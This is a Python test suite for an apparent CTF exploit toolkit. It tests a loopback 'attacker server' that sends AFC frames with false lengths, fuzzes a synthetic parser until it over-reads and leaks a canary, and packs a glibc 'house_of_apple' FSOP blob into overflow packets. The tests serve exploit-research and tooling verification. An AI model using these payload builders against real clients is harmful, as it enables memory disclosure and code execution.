"""B-108: the attacker-server harness for client-side parsers (solvers/toolkits/attacker_server.py).

The reverse direction of pwn: a malicious peer, bound to 127.0.0.1, that feeds crafted lying frames to
a client-side parser. Every test drives a *synthetic* client the test itself writes against a loopback
server the test itself starts -- no challenge binary is ever executed (rule 4), and nothing leaves
loopback. The "vulnerable parser" modelled here is a small Python function that trusts a server-declared
length and over-reads its own buffer, standing in for the Phantom-Device AFC/libimobiledevice bug.

Covered, each with a test that fails when the behaviour is wrong:
  - Protocol/Field: honest pack, the length lie (declared != real payload), const magic, and the loud
    rejections (unknown field, oversized int, bad config).
  - afc_packet: honest lengths, the lie fields, operation-name resolution.
  - AttackerServer: loopback-only enforcement, request/response logging, a callable responder that
    branches on the client's request, and read_until framing.
  - fuzz_parser: a length sweep surfaces exactly the lies that make the parser over-read, the over-read
    discloses adjacent memory (the "flag off the socket"), and the oracle contract is enforced.
  - mutation generators and the chain glue that reuses pwn_fsop and heap_primitives.
  - the byte primitives are the ones re-exported from live_harness.
  - the offline CLI.
"""
import json
import socket
import subprocess
import sys
import time

import pytest

import attacker_server as a


HERE_MODULE = a.__file__

# A canary placed in the synthetic client's memory right after its fixed buffer: recovering it is the
# "read the flag off the socket" outcome of a successful over-read.
CANARY = b"CSCTF{phantom_canary}"
BUFFER = 64

# Socket timeouts here are safety nets against a genuinely wedged thread, NOT timing assertions:
# loopback delivers the bytes synchronously, so a healthy run completes in milliseconds. They sit well
# above the documented 50-170 load so a starved daemon server thread cannot flip a test red by missing
# a tight deadline (rule 16: no wall-clock upper bound small enough to flake under load). Only a truly
# hung peer trips them, and that is a real failure worth surfacing.
CLIENT_TIMEOUT = 30.0
SRV_READ_TIMEOUT = 30.0


def _wait_for(pred, *, tries=3000, step=0.01):
    """Poll a predicate written by the server's daemon handler thread until it holds. Bounded by a
    retry count (not a wall-clock deadline): each miss sleeps `step` and retries, so it waits for an
    event rather than asserting how long the event may take. Returns whether the predicate held."""
    for _ in range(tries):
        if pred():
            return True
        time.sleep(step)
    return pred()


def _recv_to_eof(s):
    """Read from a socket until the peer closes (EOF). Used to tell 'the server sent a response frame'
    from 'the server closed without sending': the latter yields b''."""
    out = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            return out
        out += chunk


def _vulnerable_client(host, port, *, request=None):
    """A synthetic AFC-ish client: send a request, read a 40-byte reply header, then TRUST the server's
    entire_length to decide how many bytes to echo back from a fixed BUFFER-byte buffer. When the lie
    exceeds BUFFER it over-reads the adjacent CANARY. This is our own code, not a challenge binary."""
    s = socket.create_connection((host, port), timeout=CLIENT_TIMEOUT)
    try:
        s.sendall(request if request is not None else a.afc_packet("read_file", b"/flag"))
        hdr = b""
        while len(hdr) < a.AFC_HEADER_SIZE:
            chunk = s.recv(a.AFC_HEADER_SIZE - len(hdr))
            if not chunk:
                break
            hdr += chunk
        if len(hdr) < a.AFC_HEADER_SIZE:
            return b""
        entire = int.from_bytes(hdr[8:16], "little")
        memory = b"A" * BUFFER + CANARY            # buffer followed by the canary in "memory"
        want = max(0, entire - a.AFC_HEADER_SIZE)
        return memory[:want]                       # over-read when want > BUFFER
    finally:
        s.close()


# --------------------------------------------------------------------------- Protocol / Field

def test_protocol_packs_honest_lengths():
    pkt = a.afc_packet("data", b"ABCD")
    assert pkt[:8] == a.AFC_MAGIC
    assert int.from_bytes(pkt[8:16], "little") == a.AFC_HEADER_SIZE + 4   # entire_length
    assert int.from_bytes(pkt[16:24], "little") == a.AFC_HEADER_SIZE + 4  # this_length
    assert pkt[40:] == b"ABCD"


def test_length_field_can_lie():
    honest = a.afc_packet("data", b"ABCD")
    lie = a.afc_packet("data", b"ABCD", entire_length=0x1000, this_length=a.AFC_HEADER_SIZE)
    # The real payload is unchanged, but the declared length disagrees with it: the lie on the wire.
    assert lie[40:] == honest[40:] == b"ABCD"
    assert int.from_bytes(lie[8:16], "little") == 0x1000
    assert int.from_bytes(lie[16:24], "little") == a.AFC_HEADER_SIZE
    assert int.from_bytes(honest[8:16], "little") == a.AFC_HEADER_SIZE + 4


def test_operation_name_resolves():
    by_name = a.afc_packet("read_file", b"")
    by_int = a.afc_packet(a.AFC_OPS["read_file"], b"")
    assert by_name == by_int
    assert int.from_bytes(by_name[32:40], "little") == 0x0F


def test_const_field_is_fixed_magic():
    proto = a.afc_protocol()
    assert proto.header_size == a.AFC_HEADER_SIZE
    assert proto.field("magic").kind == "const"
    assert proto.pack({"packet_num": 0, "operation": 1}, payload=b"")[:8] == a.AFC_MAGIC


def test_pack_rejects_unknown_field():
    with pytest.raises(a.HarnessError):
        a.afc_protocol().pack({"nope": 1})


def test_pack_rejects_oversized_int():
    with pytest.raises(a.HarnessError):
        # entire_length is 8 bytes; 2**64 does not fit.
        a.afc_packet("data", b"", entire_length=1 << 64)


def test_field_config_is_validated():
    with pytest.raises(a.HarnessError):
        a.Field("x", "int", width=99)
    with pytest.raises(a.HarnessError):
        a.Field("", "int")
    with pytest.raises(a.HarnessError):
        a.Protocol("p", (a.Field("a", "payload"), a.Field("b", "payload")))  # two payloads


def test_pack_rejects_frame_over_max_cap():
    # The MAX_FRAME cap is a loud guard (rule 6): a frame past the cap must raise, never silently build
    # or truncate a multi-hundred-MB buffer. A payload one byte over the cap in a payload-only protocol
    # is exactly MAX_FRAME+1 bytes out.
    proto = a.Protocol("big", (a.Field("body", "payload"),))
    with pytest.raises(a.HarnessError):
        proto.pack({}, payload=b"\x00" * (a.MAX_FRAME + 1))
    # A frame exactly at the cap is still built (the cap is a strict ">", not ">=").
    assert len(proto.pack({}, payload=b"\x00" * a.MAX_FRAME)) == a.MAX_FRAME


# --------------------------------------------------------------------------- AttackerServer

def test_binds_loopback_only():
    d = a.Dialog.of(a.Exchange(respond=b"x"))
    for bad in ("0.0.0.0", "10.0.0.1", "example.com"):
        with pytest.raises(a.HarnessError):
            a.AttackerServer(d, host=bad)
    # loopback is accepted and yields an ephemeral port.
    with a.AttackerServer(d) as srv:
        assert srv.host == "127.0.0.1" and srv.port > 0


def test_logs_request_and_lying_response():
    reply = a.afc_packet("data", b"", entire_length=0x200, this_length=a.AFC_HEADER_SIZE)
    dialog = a.Dialog.of(a.Exchange(read_bytes=a.AFC_HEADER_SIZE, respond=reply, name="reply"))
    with a.AttackerServer(dialog) as srv:
        _vulnerable_client(srv.host, srv.port)
        recv, sent = srv.received(), srv.sent()
    assert recv and recv[0][:8] == a.AFC_MAGIC             # the client's request was captured
    assert int.from_bytes(recv[0][32:40], "little") == a.AFC_OPS["read_file"]
    assert sent == [reply]                                  # exactly the lying frame we scripted
    assert int.from_bytes(sent[0][8:16], "little") == 0x200


def test_callable_responder_branches_on_request():
    def respond(request, conn):
        # Lie big only for a read_file op; answer honestly otherwise.
        op = int.from_bytes(request[32:40], "little")
        if op == a.AFC_OPS["read_file"]:
            return a.afc_packet("data", b"", entire_length=0x400, this_length=a.AFC_HEADER_SIZE)
        return a.afc_packet("data", b"ok")
    dialog = a.Dialog.of(a.Exchange(read_bytes=a.AFC_HEADER_SIZE, respond=respond))
    with a.AttackerServer(dialog) as srv:
        _vulnerable_client(srv.host, srv.port, request=a.afc_packet("read_file", b""))
        big = srv.sent()
    with a.AttackerServer(dialog) as srv:
        _vulnerable_client(srv.host, srv.port, request=a.afc_packet("status", b""))
        small = srv.sent()
    assert int.from_bytes(big[0][8:16], "little") == 0x400     # read_file branched into the big lie
    assert int.from_bytes(small[0][8:16], "little") == a.AFC_HEADER_SIZE + 2  # status answered honestly


def test_read_until_delimiter():
    seen = {}

    def respond(request, conn):
        seen["req"] = request
        return b"PONG\n"
    dialog = a.Dialog.of(a.Exchange(read_until=b"\n", respond=respond))
    with a.AttackerServer(dialog, read_timeout=SRV_READ_TIMEOUT) as srv:
        s = socket.create_connection(srv.addr, timeout=CLIENT_TIMEOUT)
        s.sendall(b"PING\n")
        back = s.recv(16)
        s.close()
    assert back == b"PONG\n"
    assert seen["req"] == b"PING\n"


def test_client_hangup_before_request_sends_no_response():
    # A read exchange whose client half-closes (EOF) before sending its framed request: the server must
    # log the empty recv and END the dialog -- it must NOT fall through and send its scripted response
    # to a client that never asked (attacker_server.py:402 early return). The client half-closes its
    # write side but keeps reading, so if the server *did* wrongly respond we would receive the frame;
    # the correct server instead just closes, giving us EOF (b"").
    reply = a.afc_packet("data", b"X", entire_length=0x200, this_length=a.AFC_HEADER_SIZE)
    dialog = a.Dialog.of(a.Exchange(read_bytes=a.AFC_HEADER_SIZE, respond=reply, name="reply"))
    with a.AttackerServer(dialog, read_timeout=SRV_READ_TIMEOUT) as srv:
        s = socket.create_connection(srv.addr, timeout=CLIENT_TIMEOUT)
        s.settimeout(CLIENT_TIMEOUT)
        s.shutdown(socket.SHUT_WR)              # FIN to the server (EOF on its read); our read stays open
        back = _recv_to_eof(s)                  # server either sends the frame (wrong) or closes (right)
        s.close()
        assert _wait_for(lambda: len(srv.log) >= 1)   # the handler recorded the empty recv
    assert back == b""                          # no response frame reached the client: early return taken
    assert srv.received() == [b""]              # the client-hangup empty recv was logged
    assert srv.sent() == []                     # and nothing was sent


def test_binds_and_serves_over_ipv6():
    # The loopback allow-list accepts '::1'; exercise the AF_INET6 bind path and a full IPv6 round-trip,
    # not just the 127.0.0.1 (AF_INET) path. The per-instance server class means this family is bound
    # without mutating a shared class attribute.
    dialog = a.Dialog.of(a.Exchange(read_until=b"\n", respond=b"PONG6\n"))
    with a.AttackerServer(dialog, host="::1", read_timeout=SRV_READ_TIMEOUT) as srv:
        assert srv.host == "::1"
        info = socket.getaddrinfo(srv.host, srv.port, socket.AF_INET6, socket.SOCK_STREAM)
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(CLIENT_TIMEOUT)
        s.connect(info[0][4])
        s.sendall(b"PING6\n")
        back = s.recv(32)
        s.close()
    assert back == b"PONG6\n"                    # the IPv6 client reached the loopback server
    assert srv.received() == [b"PING6\n"]


# --------------------------------------------------------------------------- fuzz_parser

def test_fuzz_surfaces_the_overread_lie():
    # Over-read happens when entire_length - header > BUFFER, i.e. entire_length > header + BUFFER.
    boundary = a.AFC_HEADER_SIZE + BUFFER
    mutations = a.length_sweep(boundary, span=3)      # brackets the buffer boundary on the wire

    def dialog_for(entire):
        return a.Dialog.of(a.Exchange(read_bytes=a.AFC_HEADER_SIZE,
                                      respond=a.afc_packet("data", b"", entire_length=entire,
                                                           this_length=a.AFC_HEADER_SIZE)))

    def oracle(mutation, srv, result):
        # The parser disclosed memory past its own buffer -> a candidate over-read.
        return a.ANOMALY if len(result or b"") > BUFFER else a.NORMAL

    report = a.fuzz_parser(dialog_for, _vulnerable_client, mutations, oracle,
                           read_timeout=SRV_READ_TIMEOUT)
    assert len(report) == len(mutations)
    flagged = {f.mutation for f in report.anomalies}
    # Exactly the declared lengths past header+BUFFER should over-read.
    assert flagged == {m for m in mutations if m > boundary}
    assert flagged                                    # the sweep did catch the lie
    # a flagged finding carries the client's request frames it logged
    any_anom = report.anomalies[0]
    assert any_anom.received and any_anom.received[0][:8] == a.AFC_MAGIC


def test_overread_discloses_adjacent_memory():
    big = a.AFC_HEADER_SIZE + BUFFER + len(CANARY) + 8   # read well past the buffer

    def dialog_for(_):
        return a.Dialog.of(a.Exchange(read_bytes=a.AFC_HEADER_SIZE,
                                      respond=a.afc_packet("data", b"", entire_length=big,
                                                           this_length=a.AFC_HEADER_SIZE)))

    def oracle(mutation, srv, result):
        return (a.ANOMALY, result) if CANARY in (result or b"") else a.NORMAL

    report = a.fuzz_parser(dialog_for, _vulnerable_client, [big], oracle,
                           read_timeout=SRV_READ_TIMEOUT)
    assert report.anomalies, "the lie should disclose the canary past the buffer"
    assert CANARY in report.anomalies[0].detail        # the flag came back off the socket


def test_fuzz_rejects_a_bad_oracle():
    def dialog_for(_):
        return a.Dialog.of(a.Exchange(read_bytes=a.AFC_HEADER_SIZE, respond=a.afc_packet("data", b"")))
    with pytest.raises(a.HarnessError):
        a.fuzz_parser(dialog_for, _vulnerable_client, [1],
                      lambda m, s, r: "maybe")           # not NORMAL/ANOMALY


# --------------------------------------------------------------------------- mutation generators

def test_length_sweep_brackets_boundary():
    assert a.length_sweep(100, span=2) == [98, 99, 100, 101, 102]
    # clamps at zero and the width cap
    assert a.length_sweep(1, span=3, width=1) == [0, 1, 2, 3, 4]
    assert a.length_sweep(255, span=2, width=1) == [253, 254, 255]  # cap 255, no 256/257


def test_boundary_values_are_width_edges():
    assert a.boundary_values(4) == [0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFE, 0xFFFFFFFF]
    with pytest.raises(a.HarnessError):
        a.boundary_values(0)


# --------------------------------------------------------------------------- chain glue (reuse)

def test_fsop_blob_reuses_pwn_fsop():
    import pwn_fsop
    cfg = dict(file_addr=0x404000, lock=0x404100, system=0x7FFFF7000000,
               wide_data_addr=0x404200, wide_vtable_addr=0x404300, io_wfile_jumps=0x7FFFF7200000)
    blob = a.fsop_blob("house_of_apple", "2.35", **cfg)
    direct = pwn_fsop.build_fsop("house_of_apple", "2.35", **cfg)
    assert blob == direct.blob                          # thin reuse, not a reimplementation
    assert blob is not None and len(blob) > 0


def test_afc_overflow_packet_carries_the_blob_and_lies():
    cfg = dict(file_addr=0x404000, lock=0x404100, system=0x7FFFF7000000,
               wide_data_addr=0x404200, wide_vtable_addr=0x404300, io_wfile_jumps=0x7FFFF7200000)
    blob = a.fsop_blob("house_of_apple", "2.35", **cfg)
    pkt = a.afc_overflow_packet("house_of_apple", "2.35", this_length=a.AFC_HEADER_SIZE, **cfg)
    assert pkt[40:] == blob                             # the FSOP blob is the payload
    assert int.from_bytes(pkt[8:16], "little") == a.AFC_HEADER_SIZE + len(blob)
    assert int.from_bytes(pkt[16:24], "little") == a.AFC_HEADER_SIZE   # this_length lies small


def test_afc_overflow_lengths_reuses_integer_wrap():
    # count*element_size wraps 32 bits to a small 'wrapped'; copy_count*element_size is the real read.
    out = a.afc_overflow_lengths(count=0x1000001, element_size=0x100, copy_count=0x200)
    assert out["wrapped_allocation"] == 0x100
    assert out["copy_bytes"] == 0x200 * 0x100
    assert out["overflow_bytes"] == out["copy_bytes"] - out["wrapped_allocation"]
    assert out["this_length"] == a.AFC_HEADER_SIZE + out["wrapped_allocation"]
    assert out["entire_length"] == a.AFC_HEADER_SIZE + out["copy_bytes"]
    # a product that does not overflow the width must be refused loudly (no silent "bug").
    with pytest.raises(Exception):
        a.afc_overflow_lengths(count=2, element_size=2, copy_count=4)


# --------------------------------------------------------------------------- byte primitives reuse

def test_byte_helpers_are_the_live_harness_ones():
    import live_harness as lh
    assert a.p64 is lh.p64 and a.flat is lh.flat and a.cyclic is lh.cyclic
    assert a.p64(0x4142434445464748) == b"\x48\x47\x46\x45\x44\x43\x42\x41"


# --------------------------------------------------------------------------- CLI (offline)

def _run_cli(*args, input_file=None):
    return subprocess.run([sys.executable, HERE_MODULE, *args],
                          capture_output=True, text=True)


def test_cli_afc_builds_a_lying_packet(tmp_path):
    r = _run_cli("afc", "data", "--payload", "41424344", "--entire", "0x1000", "--this", "0x28")
    assert r.returncode == 0
    frame = bytes.fromhex(r.stdout.strip())
    assert frame[:8] == a.AFC_MAGIC
    assert int.from_bytes(frame[8:16], "little") == 0x1000
    assert frame[40:] == b"ABCD"


def test_cli_frame_from_spec(tmp_path):
    spec = {"name": "afc", "fields": [
        {"name": "magic", "kind": "const", "const": a.AFC_MAGIC.hex()},
        {"name": "entire_length", "kind": "length", "width": 8},
        {"name": "body", "kind": "payload"}],
        "values": {"entire_length": 4096}, "payload": "4142"}
    p = tmp_path / "spec.json"
    p.write_text(json.dumps(spec))
    r = _run_cli("frame", str(p))
    assert r.returncode == 0
    frame = bytes.fromhex(r.stdout.strip())
    assert frame[:8] == a.AFC_MAGIC
    assert int.from_bytes(frame[8:16], "little") == 4096
    assert frame.endswith(b"\x41\x42")


def test_cli_fsop_packs_overflow_packet(tmp_path):
    cfg = {"glibc_version": "2.35", "this_length": a.AFC_HEADER_SIZE,
           "file_addr": 0x404000, "lock": 0x404100, "system": 0x7FFFF7000000,
           "wide_data_addr": 0x404200, "wide_vtable_addr": 0x404300, "io_wfile_jumps": 0x7FFFF7200000}
    p = tmp_path / "cfg.json"
    p.write_text(json.dumps(cfg))
    r = _run_cli("fsop", "house_of_apple", str(p))
    assert r.returncode == 0
    frame = bytes.fromhex(r.stdout.strip())
    import pwn_fsop
    blob = pwn_fsop.build_fsop("house_of_apple", "2.35",
                               file_addr=0x404000, lock=0x404100, system=0x7FFFF7000000,
                               wide_data_addr=0x404200, wide_vtable_addr=0x404300,
                               io_wfile_jumps=0x7FFFF7200000).blob
    assert frame[40:] == blob


def test_cli_protocols_and_usage():
    r = _run_cli("protocols")
    assert r.returncode == 0 and "afc:" in r.stdout
    r2 = _run_cli("bogus")
    assert r2.returncode == 2


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
